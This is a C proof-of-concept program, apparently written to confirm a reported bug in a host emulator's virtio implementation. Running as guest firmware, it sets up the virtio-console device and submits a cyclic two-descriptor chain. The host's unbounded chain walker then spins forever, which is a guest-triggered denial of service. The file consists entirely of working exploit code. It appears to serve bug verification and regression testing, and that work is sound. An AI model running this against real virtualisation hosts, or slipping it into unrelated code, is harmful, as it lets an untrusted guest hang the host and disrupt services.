/* Independent PoC for devices-1: unbounded virtqueue descriptor-chain
   traversal => guest-triggerable infinite loop in the host emulator.

   Independent of the hunter in two ways:
     - targets the virtio-CONSOLE device (device id 3), not p9fs;
     - builds a TWO-node cycle  desc[0].next=1 -> desc[1].next=0  (not a
       self-loop), with both descriptors read-only (F_NEXT, no F_WRITE).
   on_device_queue_notify() calls virtq::get_desc_rw_avail_len() before any
   device-specific handling, and that walker follows desc.next with no cycle
   or length bound, so the host thread spins forever inside cm_run. */
#include <stdint.h>

#define VIRTIO_BASE 0x40010000UL
#define HTIF_TOHOST 0x40008000UL

#define MAGIC 0x000
#define VERSION 0x004
#define DEVICE_ID 0x008
#define DEVICE_FEATURES 0x010
#define DEVICE_FEATURES_SEL 0x014
#define DRIVER_FEATURES 0x020
#define DRIVER_FEATURES_SEL 0x024
#define QUEUE_SEL 0x030
#define QUEUE_NUM_MAX 0x034
#define QUEUE_NUM 0x038
#define QUEUE_READY 0x044
#define QUEUE_NOTIFY 0x050
#define STATUS 0x070
#define QUEUE_DESC_LOW 0x080
#define QUEUE_DESC_HIGH 0x084
#define QUEUE_AVAIL_LOW 0x090
#define QUEUE_AVAIL_HIGH 0x094
#define QUEUE_USED_LOW 0x0a0
#define QUEUE_USED_HIGH 0x0a4

#define S_ACK 1
#define S_DRIVER 2
#define S_DRIVER_OK 4
#define S_FEATURES_OK 8

#define F_NEXT 1
#define F_WRITE 2

/* Use queue 1 (the console transmitq, guest->host, naturally read-only). */
#define QIDX 1
#define DESC_ADDR  0x80200000UL
#define AVAIL_ADDR 0x80201000UL
#define USED_ADDR  0x80202000UL
#define DATA_ADDR  0x80203000UL

static inline uint32_t mr(uint64_t off){ return *(volatile uint32_t*)(VIRTIO_BASE+off); }
static inline void mw(uint64_t off, uint32_t v){ *(volatile uint32_t*)(VIRTIO_BASE+off)=v; }

static void halt(uint32_t code){
    *(volatile uint64_t*)HTIF_TOHOST = ((uint64_t)code<<1)|1;
    for(;;);
}

struct virtq_desc { uint64_t addr; uint32_t len; uint16_t flags; uint16_t next; };

void driver_main(void){
    if (mr(MAGIC) != 0x74726976u) halt(10);   /* 'virt' */
    if (mr(VERSION) != 2u) halt(11);
    if (mr(DEVICE_ID) != 3u) halt(15);        /* expect virtio-console */

    mw(STATUS, 0);
    mw(STATUS, S_ACK);
    mw(STATUS, S_ACK|S_DRIVER);

    mw(DEVICE_FEATURES_SEL, 0); uint32_t flo = mr(DEVICE_FEATURES);
    mw(DEVICE_FEATURES_SEL, 1); uint32_t fhi = mr(DEVICE_FEATURES);
    mw(DRIVER_FEATURES_SEL, 0); mw(DRIVER_FEATURES, flo);
    mw(DRIVER_FEATURES_SEL, 1); mw(DRIVER_FEATURES, fhi);

    mw(STATUS, S_ACK|S_DRIVER|S_FEATURES_OK);
    if ((mr(STATUS) & S_FEATURES_OK) == 0) halt(12);

    mw(QUEUE_SEL, QIDX);
    if (mr(QUEUE_NUM_MAX) == 0) halt(13);
    mw(QUEUE_NUM, 128);
    mw(QUEUE_DESC_LOW,  (uint32_t)DESC_ADDR);  mw(QUEUE_DESC_HIGH, 0);
    mw(QUEUE_AVAIL_LOW, (uint32_t)AVAIL_ADDR);  mw(QUEUE_AVAIL_HIGH, 0);
    mw(QUEUE_USED_LOW,  (uint32_t)USED_ADDR);  mw(QUEUE_USED_HIGH, 0);
    mw(QUEUE_READY, 1);

    mw(STATUS, S_ACK|S_DRIVER|S_FEATURES_OK|S_DRIVER_OK);
    if ((mr(STATUS) & S_DRIVER_OK) == 0) halt(14);

    /* Two-node cycle: desc[0] -> desc[1] -> desc[0], both read-only. */
    volatile struct virtq_desc *d = (volatile struct virtq_desc*)DESC_ADDR;
    d[0].addr = DATA_ADDR; d[0].len = 8; d[0].flags = F_NEXT; d[0].next = 1;
    d[1].addr = DATA_ADDR; d[1].len = 8; d[1].flags = F_NEXT; d[1].next = 0;

    /* avail ring: flags(@off0) idx(@off2) ring[0](@off4) */
    volatile uint16_t *avail = (volatile uint16_t*)AVAIL_ADDR;
    avail[0] = 0;   /* flags */
    avail[2] = 0;   /* ring[0] = descriptor index 0 */
    avail[1] = 1;   /* idx = 1 */

    /* Notify: device walks the (cyclic) descriptor chain -> infinite loop. */
    mw(QUEUE_NOTIFY, QIDX);

    /* Reached only if the device returned (i.e. the walk was bounded = fixed). */
    halt(0);
}
